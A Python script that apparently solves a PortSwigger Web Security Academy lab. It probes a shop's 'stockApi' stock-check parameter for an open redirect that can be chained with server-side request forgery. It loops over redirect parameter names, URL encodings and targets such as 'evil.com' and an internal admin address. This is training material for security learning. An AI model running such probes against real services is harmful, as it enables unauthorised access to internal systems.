#!/usr/bin/env python3
import requests
import urllib.parse
from urllib.parse import quote, quote_plus

# Target details
host = "0ad4005404f742eb810a4d2a007e00b3.web-security-academy.net"
url = f"https://{host}/product/stock"
session_cookie = "gznPsUC77W06MhodhFl9SQPElrMH0VBc"

headers = {
    'Cookie': f'session={session_cookie}',
    'Content-Type': 'application/x-www-form-urlencoded',
    'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36',
    'Accept': '*/*',
    'Origin': f'https://{host}',
    'Sec-Fetch-Site': 'same-origin',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Dest': 'empty',
    'Referer': f'https://{host}/product?productId=1',
    'Accept-Encoding': 'gzip, deflate, br'
}

# Test external redirect targets
redirect_targets = [
    "http://evil.com",
    "https://evil.com", 
    "http://192.168.0.12:8080/admin",
    "https://portswigger.net",
    "//evil.com",
    "///evil.com"
]

# Common redirect parameter names
redirect_params = [
    "redirect",
    "redir", 
    "url",
    "next",
    "return",
    "returnUrl",
    "goto",
    "target",
    "dest",
    "destination",
    "continue",
    "forward",
    "link"
]

def test_redirect(param_name, target_url):
    # Build the stockApi parameter with redirect
    base_api = "/product/stock/check?productId=1&storeId=1"
    
    # Try different encoding methods
    encodings = [
        f"{param_name}={target_url}",
        f"{param_name}={quote(target_url)}",
        f"{param_name}={quote_plus(target_url)}",
        f"{param_name}={quote(target_url, safe='')}",
    ]
    
    for encoding in encodings:
        stock_api = f"{base_api}&{encoding}"
        encoded_stock_api = quote(stock_api, safe='')
        
        data = f"stockApi={encoded_stock_api}"
        
        try:
            response = requests.post(url, headers=headers, data=data, allow_redirects=False, timeout=10)
            
            print(f"Testing {param_name} with {encoding}")
            print(f"Status: {response.status_code}")
            
            if response.status_code in [301, 302, 303, 307, 308]:
                location = response.headers.get('Location', '')
                print(f"REDIRECT FOUND! Location: {location}")
                if target_url in location or "evil.com" in location:
                    print(f"*** OPEN REDIRECT VULNERABILITY CONFIRMED ***")
                    print(f"Parameter: {param_name}")
                    print(f"Payload: {encoding}")
                    print(f"Full stockApi: {stock_api}")
                    return True
            
            print(f"Response length: {len(response.text)}")
            print("---")
            
        except Exception as e:
            print(f"Error testing {param_name}: {e}")
            print("---")
    
    return False

def main():
    print("Testing for open redirect vulnerabilities...")
    print(f"Target: {url}")
    print("=" * 60)
    
    found_redirect = False
    
    for target in redirect_targets:
        print(f"\nTesting redirect target: {target}")
        print("-" * 40)
        
        for param in redirect_params:
            if test_redirect(param, target):
                found_redirect = True
                break
        
        if found_redirect:
            break
    
    if not found_redirect:
        print("\nNo open redirect vulnerability found with tested parameters.")

if __name__ == "__main__":
    main()